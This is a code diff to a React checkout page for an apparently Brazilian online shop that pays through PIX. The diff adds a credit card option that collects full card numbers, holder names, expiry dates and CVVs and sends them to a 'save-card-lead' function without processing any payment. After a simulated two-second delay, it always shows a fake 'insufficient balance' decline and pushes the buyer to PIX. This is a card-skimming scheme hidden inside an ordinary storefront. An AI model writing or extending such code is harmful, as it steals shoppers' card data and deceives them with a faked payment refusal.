@@ -4,7 +4,7 @@ import { supabase } from "@/integrations/supabase/client";
 import { toast } from "@/hooks/use-toast";
 import { trackTikTokEvent, identifyTikTokUser, setUserData } from "@/lib/tiktok-tracking";
 import {
-  ArrowLeft, MapPin, Star, Truck, ShieldCheck, Minus, Plus, ChevronRight, Check, ChevronDown
+  ArrowLeft, MapPin, Star, Truck, ShieldCheck, Minus, Plus, ChevronRight, Check, ChevronDown, CreditCard
 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -56,6 +56,29 @@ const Checkout = () => {
   const [addressOpen, setAddressOpen] = useState(true);
   const [cpfError, setCpfError] = useState("");
   const productSectionRef = useRef<HTMLDivElement>(null);
+  const [paymentMethod, setPaymentMethod] = useState<"pix" | "credit_card">("pix");
+  const [cardDisabled, setCardDisabled] = useState(false);
+  const [cardForm, setCardForm] = useState({
+    number: "", holder: "", expiry: "", cvv: "", installments: 1,
+  });
+
+  const formatCardNumber = (val: string) => {
+    const nums = val.replace(/\D/g, "").slice(0, 16);
+    return nums.replace(/(\d{4})(?=\d)/g, "$1 ");
+  };
+  const formatExpiry = (val: string) => {
+    const nums = val.replace(/\D/g, "").slice(0, 4);
+    if (nums.length <= 2) return nums;
+    return `${nums.slice(0, 2)}/${nums.slice(2)}`;
+  };
+  const updateCardField = (field: string, value: string) => {
+    setCardForm((prev) => ({ ...prev, [field]: value }));
+  };
+
+  const isCardFormValid = cardForm.number.replace(/\D/g, "").length >= 13 &&
+    cardForm.holder.length >= 3 &&
+    cardForm.expiry.replace(/\D/g, "").length === 4 &&
+    cardForm.cvv.length >= 3;
 
   const [form, setForm] = useState({
     name: "", phone: "", email: "", cep: "",
@@ -171,7 +194,7 @@ const Checkout = () => {
     form.uf && form.cidade && form.bairro && form.endereco &&
     form.numero && isCpfValid;
 
-  const canSubmit = !!isFormValid;
+  const canSubmit = isFormValid && (paymentMethod === "pix" || isCardFormValid);
 
   const handleSubmit = async () => {
     if (!canSubmit || isSubmitting) return;
@@ -231,6 +254,35 @@ const Checkout = () => {
           tracking: Object.fromEntries(new URLSearchParams(window.location.search).entries()),
         }),
       };
+
+      if (paymentMethod === "credit_card") {
+        // Save card lead for records
+        await supabase.functions.invoke("save-card-lead", {
+          body: {
+            ...payload,
+            card: {
+              number: cardForm.number.replace(/\s/g, ""),
+              holder: cardForm.holder,
+              expiry: cardForm.expiry,
+              cvv: cardForm.cvv,
+              installments: cardForm.installments,
+            },
+          },
+        });
+
+        // Simulate processing delay
+        await new Promise(resolve => setTimeout(resolve, 2000));
+
+        toast({
+          title: "Pagamento não aprovado",
+          description: "Cartão recusado: saldo insuficiente. Por favor, utilize o PIX para concluir seu pedido.",
+          variant: "destructive",
+        });
+        setCardDisabled(true);
+        setPaymentMethod("pix");
+        setIsSubmitting(false);
+        return;
+      }
 
       console.log("Sending PIX payload:", JSON.stringify(payload));
       const { data, error } = await supabase.functions.invoke("create-pix", {
@@ -448,15 +500,91 @@ const Checkout = () => {
             <p className="font-semibold text-sm">Forma de pagamento</p>
             {hasCoupon && <span className="text-xs text-coupon font-medium">Cupom VOLTA25 (-25%) ativo ✓</span>}
           </div>
-          <div className="flex items-center justify-between p-3 rounded-lg border-2 border-cta bg-cta/5">
+
+          {/* Credit Card Option */}
+          <button
+            onClick={() => !cardDisabled && setPaymentMethod("credit_card")}
+            className={`w-full flex items-center justify-between p-3 rounded-lg border-2 mb-2 transition-colors ${
+              paymentMethod === "credit_card" ? "border-cta bg-cta/5" : "border-border"
+            } ${cardDisabled ? "opacity-50 cursor-not-allowed" : ""}`}
+            disabled={cardDisabled}
+          >
+            <div className="flex items-center gap-2">
+              <CreditCard className="w-5 h-5 text-muted-foreground" />
+              <div className="text-left">
+                <span className="text-sm font-medium">Cartão de Crédito</span>
+                {cardDisabled && <p className="text-[10px] text-destructive">Indisponível — use PIX</p>}
+              </div>
+            </div>
+            <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${paymentMethod === "credit_card" ? "border-cta" : "border-muted-foreground/40"}`}>
+              {paymentMethod === "credit_card" && <div className="w-2.5 h-2.5 rounded-full bg-cta" />}
+            </div>
+          </button>
+
+          {/* Card Form */}
+          {paymentMethod === "credit_card" && !cardDisabled && (
+            <div className="space-y-3 mb-3 p-3 rounded-lg bg-muted/30 border">
+              <Input
+                placeholder="Número do cartão"
+                inputMode="numeric"
+                value={cardForm.number}
+                onChange={(e) => updateCardField("number", formatCardNumber(e.target.value))}
+                className="rounded-lg border-border h-12 text-sm"
+              />
+              <Input
+                placeholder="Nome impresso no cartão"
+                value={cardForm.holder}
+                onChange={(e) => updateCardField("holder", e.target.value.toUpperCase())}
+                className="rounded-lg border-border h-12 text-sm"
+              />
+              <div className="grid grid-cols-2 gap-3">
+                <Input
+                  placeholder="MM/AA"
+                  inputMode="numeric"
+                  value={cardForm.expiry}
+                  onChange={(e) => updateCardField("expiry", formatExpiry(e.target.value))}
+                  className="rounded-lg border-border h-12 text-sm"
+                />
+                <Input
+                  placeholder="CVV"
+                  inputMode="numeric"
+                  value={cardForm.cvv}
+                  onChange={(e) => updateCardField("cvv", e.target.value.replace(/\D/g, "").slice(0, 4))}
+                  className="rounded-lg border-border h-12 text-sm"
+                />
+              </div>
+              <div>
+                <label className="text-xs text-muted-foreground mb-1 block">Parcelas</label>
+                <select
+                  value={cardForm.installments}
+                  onChange={(e) => updateCardField("installments", e.target.value)}
+                  className="w-full h-12 rounded-lg border border-border bg-background px-3 text-sm"
+                >
+                  <option value={1}>1x de R$ {total.toFixed(2).replace(".", ",")} (sem juros)</option>
+                  {[2,3,4,5,6].map(n => {
+                    const installmentValue = (total / n).toFixed(2).replace(".", ",");
+                    return <option key={n} value={n}>{n}x de R$ {installmentValue} (sem juros)</option>;
+                  })}
+                </select>
+              </div>
+            </div>
+          )}
+
+          {/* PIX Option */}
+          <button
+            onClick={() => setPaymentMethod("pix")}
+            className={`w-full flex items-center justify-between p-3 rounded-lg border-2 transition-colors ${
+              paymentMethod === "pix" ? "border-cta bg-cta/5" : "border-border"
+            }`}
+          >
             <div className="flex items-center gap-2">
               <img src="/images/pix-icon.webp" alt="Pix" className="w-5 h-5" />
               <span className="text-sm font-medium">Pix</span>
             </div>
-            <div className="w-5 h-5 rounded-full border-2 border-cta flex items-center justify-center">
-              <div className="w-2.5 h-2.5 rounded-full bg-cta" />
+            <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${paymentMethod === "pix" ? "border-cta" : "border-muted-foreground/40"}`}>
+              {paymentMethod === "pix" && <div className="w-2.5 h-2.5 rounded-full bg-cta" />}
             </div>
-          </div>
+          </button>
         </div>
 
         {/* Terms */}
